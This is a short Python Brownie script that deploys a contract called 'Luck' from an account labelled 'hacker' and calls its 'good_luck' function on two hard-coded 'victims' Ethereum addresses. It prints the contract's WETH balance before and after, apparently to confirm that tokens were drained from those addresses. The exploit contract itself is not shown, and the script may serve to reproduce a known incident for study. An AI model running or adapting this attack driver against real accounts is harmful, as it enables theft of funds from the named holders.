from brownie import accounts, interface, network, Luck

weth = interface.IWETH('0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2')
victims = ["0x7f4bae93c21b03836d20933ff55d9f77e5b8d34d", "0x57633FB641bACd59382b0C333D47C1A4AA2D7de4"]

def main():
    hacker = accounts[0]
    luck = Luck.deploy({'from': hacker})
    print('[Before] weth balance of luck is: ', weth.balanceOf(luck))
    luck.good_luck(victims, {'from': hacker})
    print('[After] weth balance of luck is: ', weth.balanceOf(luck))
    network.disconnect()